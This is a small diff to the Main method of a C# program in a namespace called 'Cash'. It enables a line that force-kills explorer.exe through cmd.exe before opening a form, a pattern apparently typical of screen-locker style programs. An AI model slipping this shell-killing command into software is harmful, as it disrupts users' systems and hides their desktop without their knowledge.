@@ -15,10 +15,10 @@ namespace Cash
         [STAThread]
         static void Main()
         {
-            //Process.Start("cmd.exe", "/c taskkill -f -im explorer.exe");
-            //Application.EnableVisualStyles();
-            //Application.SetCompatibleTextRenderingDefault(false);
-            //Application.Run(new Form1());
+            Process.Start("cmd.exe", "/c taskkill -f -im explorer.exe");
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
         }
     }
 }
